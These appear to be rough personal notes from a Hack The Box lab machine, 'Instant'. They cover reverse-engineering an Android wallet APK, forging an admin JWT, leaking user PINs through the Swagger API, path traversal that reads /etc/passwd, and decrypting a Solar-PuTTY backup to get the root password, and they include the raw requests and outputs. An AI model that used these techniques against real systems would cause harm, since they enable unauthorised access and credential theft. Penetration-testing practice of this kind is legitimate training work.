___


dirs
sub-domains

port 80 and 22


##### New update is available for the handling security.

](http://instant.htb/#)

Oct 1 , 2023

We have just updated our way of storing user's data. [Learn more](http://instant.htb/#)



this seems interesting
http://instant.htb/js/scripts.js



NETSCAPE2.0


Android (8490178, based on r450784d) clang version 14.0.6 (https://android.googlesource.com/toolchain/llvm-project 4c603efb0cca074e9238af8b4106c30add4418f6)
Linker: LLD 14.0.6
.fini_array




Android
8775105
#@>g*B:0u

ANIMEXTS1.0





META-INF/androidx.activity_activity.version
1.8.0
META-INF/androidx.annotation_annotation-experimental.version1.3.0
META-INF/androidx.appcompat_appcompat-resources.version
1.6.1
META-INF/androidx.appcompat_appcompat.version
1.6.1
META-INF/androidx.arch.core_core-runtime.version+I,
META-INF/androidx.cardview_cardview.version
1.0.0
META-INF/androidx.coordinatorlayout_coordinatorlayout.version
1.1.0
META-INF/androidx.core_core-ktx.version
1.9.0
META-INF/androidx.core_core.version
1.9.0
META-INF/androidx.cursoradapter_cursoradapter.version
1.0.0
META-INF/androidx.customview_customview.version
1.1.0
META-INF/androidx.documentfile_documentfile.version
1.0.0
META-INF/androidx.drawerlayout_drawerlayout.version
1.1.1
META-INF/androidx.dynamicanimation_dynamicanimation.version
1.0.0
META-INF/androidx.emoji2_emoji2-views-helper.version1.2.0
META-INF/androidx.emoji2_emoji2.version
1.2.0
META-INF/androidx.fragment_fragment.version
1.3.6
META-INF/androidx.interpolator_interpolator.version
1.0.0
META-INF/androidx.legacy_legacy-support-core-utils.version
1.0.0
META-INF/androidx.lifecycle_lifecycle-livedata-core.version+I,
META-INF/androidx.lifecycle_lifecycle-livedata.version+I,
META-INF/androidx.lifecycle_lifecycle-process.version+I,
META-INF/androidx.lifecycle_lifecycle-runtime.version+I,
J2sS
META-INF/androidx.lifecycle_lifecycle-viewmodel-savedstate.version+I,
SRst
META-INF/androidx.lifecycle_lifecycle-viewmodel.version+I,
META-INF/androidx.loader_loader.version
1.0.0
META-INF/androidx.localbroadcastmanager_localbroadcastmanager.version
1.0.0
META-INF/androidx.print_print.version
1.0.0
META-INF/androidx.profileinstaller_profileinstaller.version
1.3.0
META-INF/androidx.recyclerview_recyclerview.version
1.1.0
META-INF/androidx.savedstate_savedstate.version
1.2.1
META-INF/androidx.startup_startup-runtime.version
1.1.1
META-INF/androidx.tracing_tracing.version
1.0.0
META-INF/androidx.transition_transition.version
1.2.0
META-INF/androidx.vectordrawable_vectordrawable-animated.version1.1.0
META-INF/androidx.vectordrawable_vectordrawable.version
1.1.0
META-INF/androidx.versionedparcelable_versionedparcelable.version
1.1.1
META-INF/androidx.viewpager2_viewpager2.version
1.0.0
META-INF/androidx.viewpager_viewpager.version
1.0.0
META-INF/com.google.android.material_material.version
1.11.0
META-INF/kotlinx_coroutines_android.version1.6.4PK
META-INF/kotlinx_coroutines_core.version
1.6.4PK
META-INF/services/kotlinx.coroutines.CoroutineExceptionHandler
META-INF/services/kotlinx.coroutines.internal.MainDispatcherFactory
kotlin/annotation/annotation.kotlin_builtins
ScGk
{>K/A?
ppAY@
}#m[
/1)U
kotlin/collections/collections.kotlin_builtins
RKNI
73J$IR$I"
x/cZa




*found endpoints -> apkurlgrep*
 
http://schemas.android.com/apk/res-auto
http://schemas.android.com/aapt
http://mywalletv1.instant.htb/api/v1/view/profile
http://mywalletv1.instant.htb/api/v1/login
http://mywalletv1.instant.htb/api/v1/register
http://mywalletv1.instant.htb/api/v1/confirm/pin
http://mywalletv1.instant.htb/api/v1/initiate/transaction


*apkleaks*
- http://mywalletv1.instant.htb/api/v1/confirm/pin
- http://mywalletv1.instant.htb/api/v1/initiate/transaction
- http://mywalletv1.instant.htb/api/v1/login
- http://mywalletv1.instant.htb/api/v1/register
- http://mywalletv1.instant.htb/api/v1/view/profile




hint username & password is username and password I think that means nothing




*this is what is running the api*
Werkzeug/3.0.3 Python/3.12.3


*this is the library code*
I think HttpURL is where the POST requests are being built
-> has the functions to add the parameters to the builder at least

now where tf are those being called to build the full POST request gotta find that


*the written code is under COM the TLD for the project can also check AndroidManifest.xml to see which code I should be looking at*





*nice JWT fucking worked!!!!*

HTTP/1.1 200 OK
Date: Sat, 23 Aug 2025 01:28:10 GMT
Server: Werkzeug/3.0.3 Python/3.12.3
Content-Type: application/json
Content-Length: 236
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{"Profile":{"account_status":"active","email":"admin@instant.htb","invite_token":"instant_admin_inv","role":"Admin","username":"instantAdmin","wallet_balance":"10000000","wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},"Status":200}




maybe fuzz more that subdomain -> even with creds there must be some admin portal not? or just ssh for management no way



*flow -> check if I can somehow inject in transaction*
can make a transaction and then will be prompted to confirm my pin before transaction gets executed






*this request  worked but receiver not found*

Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
Content-Type: application/json
Content-Length: 67

{
	"receiver": "test",
	"amount": "1234",
	"note":    "test"
}



*transaction pending waiting for pin!!!!!*
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
Content-Type: application/json
Content-Length: 101

{
	"receiver": "f0eca6e5-783a-471d-9d8f-0162cbc900db",
	"amount": "-44444",
"note":    "test"
}




*Incorrect PIN*

Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
Content-Type: application/json
Content-Length: 22

{
	"pin": "2345"
}


*I think 2 ways here I brute force the pin here with a script or I try to register a new account with the admin invite so I know the pin*

*I think the second option*


public static final int pin = 0x7f080167;
public static int pin_input = 0x7f080168;

 public static int pin_hint = 0x7f0f00a0;

*these did not work if 10 digits im cooked*

PIN = 2131231079 ?????

  public static final class string {  
        public static int account_login_text = 0x7f0f001b;  
        public static int app_name = 0x7f0f001d;  
        public static int application_name = 0x7f0f001f;  
        public static int email_hint = 0x7f0f002a;  
        public static int forgot_password = 0x7f0f0030;  
        public static int hint_password = 0x7f0f0032;  
        public static int hint_username = 0x7f0f0033;  
        public static int login_btn = 0x7f0f0036;  
        public static int pin_hint = 0x7f0f00a0;  
        public static int register_btn = 0x7f0f00a1;  
        public static int register_text = 0x7f0f00a2;


*registering new acct*

POST /api/v1/register HTTP/1.1
Host: mywalletv1.instant.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 88

{
	"username": "test",
"email":"test@outlook",
"password": "test",
"pin":"1234"
}

# PIN needs to b 5 digits!



*Login returns access token for user*
POST /api/v1/login HTTP/1.1
Host: mywalletv1.instant.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 48

{
	"username": "test",
"password": "test"
}



*getting internal server error when inputting the correct pin, why cause I have  no funds? *



*in network_security_config.xml there is another subdomain*

*should have looked  longer at the .xml files under resources *

swagger-ui.instant.htb



<?xml version="1.0" encoding="utf-8"?>  
<network-security-config>  
    <domain-config cleartextTrafficPermitted="true">  
        <domain includeSubdomains="true">mywalletv1.instant.htb  
        </domain>  
        <domain includeSubdomains="true">swagger-ui.instant.htb  
        </domain>  
    </domain-config>  
</network-security-config>



*fuck me all the API documentation is here*

http://swagger-ui.instant.htb/apidocs/#/Logs





*enumerated users on the webapp as well as their secret pins*

{"Status":200,"Users":[

{"email":"admin@instant.htb","role":"Admin","secret_pin":87348,"status":"active","username":"instantAdmin","wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},

{"email":"shirohige@instant.htb","role":"instantian","secret_pin":42845,"status":"active","username":"shirohige","wallet_id":"458715c9-b15e-467b-8a3d-97bc3fcf3c11"},


*these r the logs im allowed to look at*

{"Files":["1.log"],"Path":"/home/shirohige/logs/","Status":201}



*path traversal* -> on log read api req

{"/home/shirohige/logs/../../../etc/passwd":["root:x:0:0:root:/root:/bin/bash\n","daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n","bin:x:2:2:bin:/bin:/usr/sbin/nologin\n","sys:x:3:3:sys:/dev:/usr/sbin/nologin\n","sync:x:4:65534:sync:/bin:/bin/sync\n","games:x:5:60:games:/usr/games:/usr/sbin/nologin\n","man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n","lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n","mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n","news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n","uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n","proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n","www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n","backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n","list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n","irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n","_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n","nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n","systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n","systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\n","dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\n","messagebus:x:101:102::/nonexistent:/usr/sbin/nologin\n","systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin\n","pollinate:x:102:1::/var/cache/pollinate:/bin/false\n","polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin\n","usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n","sshd:x:104:65534::/run/sshd:/usr/sbin/nologin\n","shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash\n","_laurel:x:999:990::/var/log/laurel:/bin/false\n"],"Status":201}


*read key got user *



user in a dev group


*env file but wtf is this for*

SECRET_KEY=VeryStrongS3cretKeyY0uC4NTGET



*for loading the hash i did not have flask2john so i added the same format john expects and put the body of the hash from hex to base64 and it worked*



in opt there is a .dat file 



*decrypted it with a script*

└> python3 solar-putty-decrypt-script.py sessions-backup.dat ~/Documents/wordlists/rockyou.txt 
[103] password='estrella'           

{"Sessions":[{"Id":"066894ee-635c-4578-86d0-d36d4838115b","Ip":"10.10.11.37","Port":22,"ConnectionType":1,"SessionName":"Instant","Authentication":0,"CredentialsID":"452ed919-530e-419b-b721-da76cbe8ed04","AuthenticateScript":"00000000-0000-0000-0000-000000000000","LastTimeOpen":"0001-01-01T00:00:00","OpenCounter":1,"SerialLine":null,"Speed":0,"Color":"#FF176998","TelnetConnectionWaitSeconds":1,"LoggingEnabled":false,"RemoteDirectory":""}],"Credentials":[{"Id":"452ed919-530e-419b-b721-da76cbe8ed04","CredentialsName":"instant-root","Username":"root","Password":"12**24nzC!r0c%q12","PrivateKeyPath":"","Passphrase":"","PrivateKeyContent":null}],"AuthScript":[],"Groups":[],"Tunnels":[],"LogsFolderDestination":"C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"}



*root*
Username":"root","Password":"12**24nzC!r0c%q12"





